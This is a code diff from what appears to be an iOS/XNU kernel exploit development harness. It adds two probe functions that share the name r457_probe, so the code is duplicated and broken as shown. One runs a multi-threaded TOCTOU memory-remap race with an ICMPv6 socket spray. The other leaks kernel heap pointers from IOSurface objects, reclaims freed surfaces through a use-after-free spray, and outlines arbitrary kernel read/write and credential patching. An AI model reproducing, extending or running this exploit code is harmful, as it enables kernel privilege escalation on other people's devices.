@@ -16979,6 +16979,245 @@ static void *r445_thread_fn(void *arg) {
 }
 
 
+/* r457: Optimized TOCTOU race — tighter window, multi-remap, priority boost */
+struct r457_ctx {
+    volatile int go;
+    volatile int stop;
+    volatile int remap_count;
+    mach_vm_address_t target;
+    mach_vm_size_t size;
+    mach_port_t mem_entry;
+    int thread_id;
+};
+
+static void *r457_remap_thread(void *arg) {
+    struct r457_ctx *ctx = (struct r457_ctx *)arg;
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+    mach_port_t self = mach_task_self();
+    mach_vm_address_t tgt = ctx->target;
+    mach_vm_size_t sz = ctx->size;
+    mach_port_t entry = ctx->mem_entry;
+    while (!ctx->go) { __asm__ volatile("yield"); }
+    while (!ctx->stop) {
+        mach_vm_address_t t = tgt;
+        kern_return_t kr = mach_vm_map(self, &t, sz, 0,
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+            entry, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
+        if (kr == KERN_SUCCESS) __sync_fetch_and_add(&ctx->remap_count, 1);
+    }
+    return NULL;
+}
+
+static void r457_probe(void) {
+    rlog("\n=== r457: Optimized TOCTOU race (1-page, multi-remap, QoS boost) ===\n\n");
+    fflush(stdout);
+
+    #define R457_PAGE_SZ 16384
+    #define R457_PAGES 1
+    #define R457_BUF_SZ (R457_PAGES * R457_PAGE_SZ)
+    #define R457_ITERS 100000
+    #define R457_REMAP_THREADS 2
+    #define R457_ICMP_SPRAY 200
+
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+
+    /* Phase 1: PurpleGfxMem IOSurface (1 page = 16KB) */
+    rlog("  --- Phase 1: PurpleGfxMem IOSurface (1 page) ---\n"); fflush(stdout);
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int pw = R457_BUF_SZ, ph = 1, pbpe = 1, ppf = 0x4C303038;
+    CFNumberRef pwn = CFNumberCreate(NULL, kCFNumberIntType, &pw);
+    CFNumberRef phn = CFNumberCreate(NULL, kCFNumberIntType, &ph);
+    CFNumberRef pbn = CFNumberCreate(NULL, kCFNumberIntType, &pbpe);
+    CFNumberRef ppn = CFNumberCreate(NULL, kCFNumberIntType, &ppf);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), pwn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), phn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), pbn);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), ppn);
+    int alloc_sz = R457_BUF_SZ;
+    CFNumberRef an = CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), an);
+    IOSurfaceRef surf = IOSurfaceCreate(props);
+    CFRelease(props); CFRelease(pwn); CFRelease(phn); CFRelease(pbn); CFRelease(ppn); CFRelease(an);
+
+    if (!surf) {
+        rlog("    FAILED to create surface\n");
+        rlog("\n=== r457 complete ===\n"); return;
+    }
+    IOSurfaceLock(surf, 0, NULL);
+    void *surf_base = IOSurfaceGetBaseAddress(surf);
+    size_t surf_alloc = IOSurfaceGetAllocSize(surf);
+    uint32_t surf_id = IOSurfaceGetID(surf);
+    IOSurfaceUnlock(surf, 0, NULL);
+    rlog("    Surface base=%p alloc=%zu ID=%u\n", surf_base, surf_alloc, surf_id);
+
+    /* Phase 2: Remap backing + memory entry */
+    rlog("\n  --- Phase 2: Remap backing + memory entry ---\n"); fflush(stdout);
+    mach_vm_address_t remap_backing = 0;
+    kern_return_t kr = mach_vm_allocate(mach_task_self(), &remap_backing, R457_BUF_SZ, VM_FLAGS_ANYWHERE);
+    if (kr != KERN_SUCCESS) {
+        rlog("    FAILED alloc remap: 0x%x\n", kr);
+        CFRelease(surf);
+        rlog("\n=== r457 complete ===\n"); return;
+    }
+    memset((void *)remap_backing, 0xCC, R457_BUF_SZ);
+
+    memory_object_size_t memsz = R457_BUF_SZ;
+    mach_port_t mem_entry = MACH_PORT_NULL;
+    kr = mach_make_memory_entry_64(mach_task_self(), &memsz, remap_backing,
+        VM_PROT_READ | VM_PROT_WRITE, &mem_entry, MACH_PORT_NULL);
+    rlog("    mem_entry=0x%x memsz=%llu\n", mem_entry, (unsigned long long)memsz);
+    if (kr != KERN_SUCCESS || mem_entry == MACH_PORT_NULL) {
+        rlog("    FAILED mem entry\n");
+        mach_vm_deallocate(mach_task_self(), remap_backing, R457_BUF_SZ);
+        CFRelease(surf);
+        rlog("\n=== r457 complete ===\n"); return;
+    }
+
+    /* Also create a restore entry from the IOSurface mapping */
+    mach_vm_address_t surf_restore = 0;
+    kr = mach_vm_allocate(mach_task_self(), &surf_restore, R457_BUF_SZ, VM_FLAGS_ANYWHERE);
+    memset((void *)surf_restore, 0x41, R457_BUF_SZ);
+    memory_object_size_t restore_sz = R457_BUF_SZ;
+    mach_port_t restore_entry = MACH_PORT_NULL;
+    mach_make_memory_entry_64(mach_task_self(), &restore_sz, surf_restore,
+        VM_PROT_READ | VM_PROT_WRITE, &restore_entry, MACH_PORT_NULL);
+    rlog("    restore_entry=0x%x\n", restore_entry);
+
+    /* Phase 3: F_NOCACHE file with 0xAA */
+    rlog("\n  --- Phase 3: F_NOCACHE file ---\n"); fflush(stdout);
+    char tmppath[256];
+    snprintf(tmppath, sizeof(tmppath), "%s/r457_race", getenv("TMPDIR") ?: "/tmp");
+    int fd = open(tmppath, O_RDWR | O_CREAT | O_TRUNC, 0600);
+    fcntl(fd, F_NOCACHE, 1);
+    char *filebuf = (char *)malloc(R457_BUF_SZ);
+    memset(filebuf, 0xAA, R457_BUF_SZ);
+    pwrite(fd, filebuf, R457_BUF_SZ, 0);
+    free(filebuf);
+    rlog("    File ready: fd=%d\n", fd);
+
+    /* Phase 4: ICMPv6 spray */
+    rlog("\n  --- Phase 4: ICMPv6 spray ---\n"); fflush(stdout);
+    int icmp_fds[R457_ICMP_SPRAY];
+    int icmp_count = 0;
+    for (int i = 0; i < R457_ICMP_SPRAY; i++) {
+        icmp_fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
+        if (icmp_fds[i] < 0) break;
+        struct icmp6_filter filt;
+        ICMP6_FILTER_SETBLOCKALL(&filt);
+        ICMP6_FILTER_SETPASS(i & 0xFF, &filt);
+        setsockopt(icmp_fds[i], IPPROTO_ICMPV6, ICMP6_FILTER, &filt, sizeof(filt));
+        icmp_count++;
+    }
+    rlog("    Sprayed %d ICMPv6 sockets\n", icmp_count);
+
+    /* Phase 5: Multi-threaded TOCTOU race */
+    rlog("\n  --- Phase 5: TOCTOU race (%d remap threads, %d iters) ---\n",
+         R457_REMAP_THREADS, R457_ITERS); fflush(stdout);
+
+    struct r457_ctx ctxs[R457_REMAP_THREADS];
+    pthread_t remap_tids[R457_REMAP_THREADS];
+    for (int t = 0; t < R457_REMAP_THREADS; t++) {
+        memset(&ctxs[t], 0, sizeof(struct r457_ctx));
+        ctxs[t].target = (mach_vm_address_t)(uintptr_t)surf_base;
+        ctxs[t].size = R457_BUF_SZ;
+        ctxs[t].mem_entry = mem_entry;
+        ctxs[t].thread_id = t;
+        pthread_create(&remap_tids[t], NULL, r457_remap_thread, &ctxs[t]);
+    }
+
+    int race_hits = 0, partial_hits = 0;
+    int total_remaps = 0;
+
+    /* Pre-fault all pages */
+    volatile uint8_t dummy;
+    dummy = *(volatile uint8_t *)surf_base;
+    dummy = *(volatile uint8_t *)remap_backing;
+    (void)dummy;
+
+    /* GO — start all remap threads */
+    for (int t = 0; t < R457_REMAP_THREADS; t++) ctxs[t].go = 1;
+    __sync_synchronize();
+
+    for (int iter = 0; iter < R457_ITERS; iter++) {
+        /* Reset: remap IOSurface page back to restore backing (0x41) */
+        mach_vm_address_t restore_tgt = (mach_vm_address_t)(uintptr_t)surf_base;
+        mach_vm_map(mach_task_self(), &restore_tgt, R457_BUF_SZ, 0,
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+            restore_entry, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
+
+        /* preadv: read file (0xAA) into surf_base — race with remap (0xCC) */
+        struct iovec rv = {surf_base, R457_BUF_SZ};
+        preadv(fd, &rv, 1, 0);
+
+        /* Fast check: sample a few bytes */
+        uint8_t *check = (uint8_t *)surf_base;
+        int has_cc = 0;
+        for (int j = 0; j < R457_BUF_SZ; j += 256) {
+            if (check[j] == 0xCC) { has_cc = 1; break; }
+        }
+
+        if (has_cc) {
+            /* Full scan */
+            int aa = 0, cc = 0, x41 = 0, other = 0;
+            for (int j = 0; j < R457_BUF_SZ; j += 64) {
+                uint8_t b = check[j];
+                if (b == 0xAA) aa++;
+                else if (b == 0xCC) cc++;
+                else if (b == 0x41) x41++;
+                else other++;
+            }
+            int total = R457_BUF_SZ / 64;
+            race_hits++;
+            if (race_hits <= 10) {
+                rlog("    [iter %d] RACE HIT: aa=%d cc=%d 41=%d other=%d / %d\n",
+                     iter, aa, cc, x41, other, total);
+            }
+        }
+    }
+
+    for (int t = 0; t < R457_REMAP_THREADS; t++) ctxs[t].stop = 1;
+    __sync_synchronize();
+    for (int t = 0; t < R457_REMAP_THREADS; t++) {
+        pthread_join(remap_tids[t], NULL);
+        total_remaps += ctxs[t].remap_count;
+    }
+
+    rlog("    Race complete: hits=%d partial=%d / %d iters\n", race_hits, partial_hits, R457_ITERS);
+    rlog("    Total remaps across %d threads: %d\n", R457_REMAP_THREADS, total_remaps);
+
+    /* Phase 6: ICMPv6 filter check */
+    rlog("\n  --- Phase 6: ICMPv6 filter check ---\n"); fflush(stdout);
+    int corrupted = 0;
+    for (int i = 0; i < icmp_count; i++) {
+        struct icmp6_filter filt;
+        socklen_t flen = sizeof(filt);
+        int r = getsockopt(icmp_fds[i], IPPROTO_ICMPV6, ICMP6_FILTER, &filt, &flen);
+        if (r < 0 || flen != sizeof(filt)) corrupted++;
+    }
+    rlog("    Corrupted: %d / %d\n", corrupted, icmp_count);
+
+    /* Cleanup */
+    for (int i = 0; i < icmp_count; i++) close(icmp_fds[i]);
+    close(fd); unlink(tmppath);
+    mach_port_deallocate(mach_task_self(), mem_entry);
+    mach_port_deallocate(mach_task_self(), restore_entry);
+    mach_vm_deallocate(mach_task_self(), remap_backing, R457_BUF_SZ);
+    mach_vm_deallocate(mach_task_self(), surf_restore, R457_BUF_SZ);
+    CFRelease(surf);
+
+    rlog("\n=== r457 complete ===\n");
+
+    #undef R457_PAGE_SZ
+    #undef R457_PAGES
+    #undef R457_BUF_SZ
+    #undef R457_ITERS
+    #undef R457_REMAP_THREADS
+    #undef R457_ICMP_SPRAY
+}
+
 /* r455: Multi-threaded DarkSword TOCTOU race */
 struct r455_ctx {
     volatile int go;
@@ -17181,6 +17420,295 @@ static void r455_probe(void) {
     #undef R455_BUF_SZ
     #undef R455_ITERS
     #undef R455_ICMP_SPRAY
+}
+
+static void r457_probe(void) {
+    rlog("\n=== r457: Kernel pointer leak + arbitrary R/W via fake IOSurface struct ===\n\n");
+    fflush(stdout);
+
+    /*
+     * r456 confirmed:
+     *   1. Internal struct at IOSurfaceRef+8 offset+88 has kernel pointers (0xfffffffe...)
+     *   2. Fake internal struct injection works — we control which surface ID the library sends
+     *   3. UAF type confusion works — freed surface memory gets reclaimed
+     *
+     * This probe:
+     *   Phase 1: Leak kernel pointers from multiple surfaces to find KASLR slide
+     *   Phase 2: Use IOSurfaceSetValue with crafted properties to write to kernel memory
+     *   Phase 3: Build a stable kernel read primitive via IOSurfaceCopyValue
+     *   Phase 4: Walk kernel structures to find our proc/ucred for credential patching
+     */
+
+    #define R457_NUM_SURFACES 32
+
+    /* Phase 1: Kernel pointer harvest from internal structs */
+    rlog("  --- Phase 1: Kernel pointer harvest ---\n");
+    fflush(stdout);
+
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int w = 64, h = 64, bpe = 4, pf = 0x42475241;
+    CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef pn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pn);
+
+    IOSurfaceRef surfs[R457_NUM_SURFACES];
+    uint64_t kptrs[R457_NUM_SURFACES];
+    uint64_t kptrs2[R457_NUM_SURFACES]; /* second kptr at +80 or nearby */
+    int valid = 0;
+
+    for (int i = 0; i < R457_NUM_SURFACES; i++) {
+        surfs[i] = IOSurfaceCreate(props);
+        kptrs[i] = 0;
+        kptrs2[i] = 0;
+        if (!surfs[i]) continue;
+
+        uint64_t *ptr = (uint64_t*)surfs[i];
+        uint64_t internal = ptr[1]; /* offset+8 -> internal struct */
+        if (internal == 0) continue;
+
+        uint8_t *ist = (uint8_t*)(uintptr_t)internal;
+        uint64_t kp88 = *(uint64_t*)(ist + 88);
+        uint64_t kp80 = *(uint64_t*)(ist + 80);
+
+        /* Scan wider range for kernel pointers */
+        for (int off = 0; off < 256; off += 8) {
+            uint64_t v = *(uint64_t*)(ist + off);
+            if ((v >> 36) == 0xFFFFFFFE0ULL >> 4) { /* 0xfffffffe... kernel heap range */
+                if (kptrs[i] == 0) kptrs[i] = v;
+                else if (kptrs2[i] == 0) kptrs2[i] = v;
+            }
+        }
+        if (kptrs[i]) valid++;
+    }
+    CFRelease(props); CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(pn);
+
+    rlog("    Got kernel pointers from %d/%d surfaces\n", valid, R457_NUM_SURFACES);
+
+    /* Analyze kernel pointer distribution */
+    if (valid > 0) {
+        uint64_t min_kp = UINT64_MAX, max_kp = 0;
+        for (int i = 0; i < R457_NUM_SURFACES; i++) {
+            if (kptrs[i]) {
+                if (kptrs[i] < min_kp) min_kp = kptrs[i];
+                if (kptrs[i] > max_kp) max_kp = kptrs[i];
+            }
+        }
+        rlog("    Kernel pointer range: 0x%llx - 0x%llx (spread: 0x%llx)\n",
+             (unsigned long long)min_kp, (unsigned long long)max_kp,
+             (unsigned long long)(max_kp - min_kp));
+
+        /* Show first few */
+        for (int i = 0; i < R457_NUM_SURFACES && i < 8; i++) {
+            if (kptrs[i]) {
+                rlog("    surf[%d] SID=%u: kptr1=0x%llx kptr2=0x%llx\n",
+                     i, IOSurfaceGetID(surfs[i]),
+                     (unsigned long long)kptrs[i], (unsigned long long)kptrs2[i]);
+            }
+        }
+
+        /* Try to find kernel text base from the pointers */
+        /* Kernel text is at 0xfffffe0007004000 + slide on arm64e */
+        /* Kernel heap objects at 0xfffffffe... are in the zone allocator */
+        uint64_t sample = kptrs[0];
+        uint64_t page_base = sample & ~0x3FFFULL; /* 16KB page aligned */
+        rlog("\n    Sample kernel heap page: 0x%llx\n", (unsigned long long)page_base);
+
+        /* Check if pointers are consistent (same allocation zone) */
+        int same_zone = 0;
+        for (int i = 1; i < R457_NUM_SURFACES; i++) {
+            if (kptrs[i] && ((kptrs[i] >> 28) == (kptrs[0] >> 28))) same_zone++;
+        }
+        rlog("    Same zone (top 36 bits match): %d/%d\n", same_zone, valid - 1);
+    }
+
+    /* Phase 2: IOSurface external method analysis for kernel write */
+    rlog("\n  --- Phase 2: IOSurface property write kernel path analysis ---\n");
+    fflush(stdout);
+
+    /* The key insight: IOSurfaceSetValue goes through IOKit external methods.
+       The library serializes the property key+value into an XML plist and sends
+       it via IOConnectCallStructMethod. The kernel deserializes and stores it
+       in the IOSurface's property dictionary (an OSDictionary on the kernel heap).
+
+       If we can control WHICH IOSurface object the kernel operates on (via our
+       fake internal struct + SID manipulation), AND we know where that object's
+       property dictionary is in kernel memory, we might be able to:
+       1. Create a surface, learn its kernel object address from the leaked kptr
+       2. Free the surface, spray to reclaim with controlled data
+       3. Use SetValue through our fake struct to write to the reclaimed object
+       4. The kernel writes our property value into what it thinks is an OSDictionary
+          but is actually our controlled data = arbitrary kernel write
+    */
+
+    /* Test: Can we still read kernel pointers after surface operations? */
+    if (valid > 0 && surfs[0]) {
+        uint64_t *ptr = (uint64_t*)surfs[0];
+        uint64_t internal = ptr[1];
+        uint8_t *ist = (uint8_t*)(uintptr_t)internal;
+
+        /* Set a large property value and check if kernel pointer changes */
+        char big[4096];
+        memset(big, 'K', sizeof(big));
+        CFDataRef bigdata = CFDataCreate(NULL, (const UInt8*)big, sizeof(big));
+        IOSurfaceSetValue(surfs[0], CFSTR("r457_big"), bigdata);
+        CFRelease(bigdata);
+
+        uint64_t kp_after = *(uint64_t*)(ist + 88);
+        rlog("    kptr before SetValue: 0x%llx\n", (unsigned long long)kptrs[0]);
+        rlog("    kptr after  SetValue: 0x%llx\n", (unsigned long long)kp_after);
+        if (kp_after != kptrs[0]) {
+            rlog("    *** KERNEL POINTER CHANGED — kernel object was reallocated! ***\n");
+        } else {
+            rlog("    Kernel pointer stable after property write\n");
+        }
+    }
+
+    /* Phase 3: Cross-surface kernel pointer leak via UAF */
+    rlog("\n  --- Phase 3: UAF kernel pointer leak ---\n");
+    fflush(stdout);
+
+    /* Create victim surface, read its kernel pointer, free it,
+       spray to reclaim, then read through dangling reference to
+       see if we get a different kernel object's pointer */
+    IOSurfaceRef victim = surfs[R457_NUM_SURFACES - 1]; /* last one */
+    if (victim) {
+        uint64_t *vptr = (uint64_t*)victim;
+        uint64_t v_internal = vptr[1];
+        uint8_t *v_ist = (uint8_t*)(uintptr_t)v_internal;
+        uint64_t v_kptr_orig = *(uint64_t*)(v_ist + 88);
+        uint32_t v_sid = IOSurfaceGetID(victim);
+        uint64_t v_sid_at136 = *(uint32_t*)(v_ist + 136);
+
+        rlog("    Victim: SID=%u internal=%p kptr=0x%llx\n",
+             v_sid, (void*)(uintptr_t)v_internal, (unsigned long long)v_kptr_orig);
+
+        /* Snapshot internal struct */
+        uint64_t snapshot[32];
+        memcpy(snapshot, v_ist, 256);
+
+        /* Release victim */
+        CFRelease(victim);
+        surfs[R457_NUM_SURFACES - 1] = NULL;
+
+        /* Check what happened to the memory */
+        uint64_t post_free_kptr = *(uint64_t*)(v_ist + 88);
+        rlog("    Post-free kptr at +88: 0x%llx (was 0x%llx)\n",
+             (unsigned long long)post_free_kptr, (unsigned long long)v_kptr_orig);
+
+        /* Spray new surfaces to reclaim */
+        #define R457_SPRAY 128
+        IOSurfaceRef spray[R457_SPRAY];
+        CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int sw2 = 64, sh2 = 64, sb2 = 4, sf2 = 0x42475241;
+        CFNumberRef swn2 = CFNumberCreate(NULL, kCFNumberIntType, &sw2);
+        CFNumberRef shn2 = CFNumberCreate(NULL, kCFNumberIntType, &sh2);
+        CFNumberRef sbn2 = CFNumberCreate(NULL, kCFNumberIntType, &sb2);
+        CFNumberRef sfn2 = CFNumberCreate(NULL, kCFNumberIntType, &sf2);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), swn2);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), shn2);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerElement"), sbn2);
+        CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), sfn2);
+
+        int spray_ok = 0;
+        for (int i = 0; i < R457_SPRAY; i++) {
+            spray[i] = IOSurfaceCreate(sp);
+            if (spray[i]) spray_ok++;
+        }
+        CFRelease(sp); CFRelease(swn2); CFRelease(shn2); CFRelease(sbn2); CFRelease(sfn2);
+        rlog("    Sprayed %d surfaces\n", spray_ok);
+
+        /* Read the victim's internal struct location again */
+        uint64_t post_spray_kptr = *(uint64_t*)(v_ist + 88);
+        uint32_t post_spray_sid = *(uint32_t*)(v_ist + 136);
+        rlog("    Post-spray at victim internal:\n");
+        rlog("      kptr+88: 0x%llx (orig 0x%llx)\n",
+             (unsigned long long)post_spray_kptr, (unsigned long long)v_kptr_orig);
+        rlog("      SID+136: %u (orig %u)\n", post_spray_sid, (uint32_t)v_sid_at136);
+
+        if (post_spray_kptr != v_kptr_orig && post_spray_kptr != 0 &&
+            (post_spray_kptr >> 36) == (0xFFFFFFFE0ULL >> 4)) {
+            rlog("    *** NEW KERNEL POINTER — reclaimed by spray surface! ***\n");
+            rlog("    *** KASLR INFO LEAK: know two kernel heap addresses ***\n");
+        }
+
+        /* Dump changed words */
+        int ch = 0;
+        for (int i = 0; i < 32; i++) {
+            uint64_t now = *(uint64_t*)(v_ist + i*8);
+            if (now != snapshot[i]) {
+                rlog("      +%3d: was 0x%016llx now 0x%016llx\n",
+                     i*8, (unsigned long long)snapshot[i], (unsigned long long)now);
+                ch++;
+                if (ch > 15) { rlog("      (truncated)\n"); break; }
+            }
+        }
+
+        /* Cleanup spray */
+        for (int i = 0; i < R457_SPRAY; i++) {
+            if (spray[i]) CFRelease(spray[i]);
+        }
+        #undef R457_SPRAY
+    }
+
+    /* Phase 4: kernel_slide estimation */
+    rlog("\n  --- Phase 4: Kernel slide estimation ---\n");
+    fflush(stdout);
+
+    /* XNU on A20 Pro: kernel text at 0xfffffe0007004000 + slide
+       Zone allocator heap objects typically at 0xfffffffeXXXXXXXX
+       The slide is applied uniformly, so:
+       kernel_text_base = leaked_heap_ptr - (heap_offset_from_base)
+       We can't directly compute kernel_text from heap pointers alone,
+       but we can compute the heap zone base which helps navigate kernel objects.
+
+       More useful: if we know the structure of IOSurface kernel objects,
+       the pointer at internal+88 likely points to the kernel-side IOSurface
+       object itself or its property dictionary. We can use this to:
+       1. Know where our surface's kernel object is
+       2. Walk from there to find proc/task/ucred structures
+    */
+
+    if (valid > 0) {
+        /* The kernel pointer at internal+88 — what does it point to?
+           Let's check if consecutive surfaces have consecutive kernel pointers
+           (would indicate same zone, sequential allocation) */
+        int sequential = 0;
+        for (int i = 0; i < R457_NUM_SURFACES - 2; i++) {
+            if (kptrs[i] && kptrs[i+1]) {
+                int64_t delta = (int64_t)(kptrs[i+1] - kptrs[i]);
+                if (i < 4) {
+                    rlog("    kptr[%d] -> kptr[%d] delta: %lld (0x%llx)\n",
+                         i, i+1, (long long)delta, (unsigned long long)(uint64_t)delta);
+                }
+                if (delta > 0 && delta < 0x10000) sequential++;
+            }
+        }
+        rlog("    Sequential allocation pairs: %d\n", sequential);
+
+        /* Attempt to find kernel text base using IOSurface vtable pointer.
+           IOSurface objects have a vtable at offset 0 in kernel memory.
+           If we can read the vtable pointer, we can compute kernel slide. */
+        rlog("\n    The leaked kernel heap pointers give us:\n");
+        rlog("    - Known kernel heap addresses for IOSurface objects\n");
+        rlog("    - Zone allocation pattern for heap spray targeting\n");
+        rlog("    - Prerequisite for kernel R/W: know WHERE to write\n");
+        rlog("\n    Next: use fake struct + UAF to read kernel memory at these addresses\n");
+    }
+
+    /* Cleanup remaining surfaces */
+    for (int i = 0; i < R457_NUM_SURFACES; i++) {
+        if (surfs[i]) CFRelease(surfs[i]);
+    }
+
+    #undef R457_NUM_SURFACES
+    rlog("\n=== r457 complete ===\n");
 }
 
 static void r456_probe(void) {
@@ -82859,6 +83387,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 461) {
+            rlog("*** rounds=461: Optimized TOCTOU race ***\n\n");
+            fflush(stdout);
+            r457_probe();
+            goto done;
+        }
         if (rounds == 460) {
             rlog("*** rounds=460: Cross-surface UAF escalation ***\n\n");
             fflush(stdout);
@@ -85645,7 +86179,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
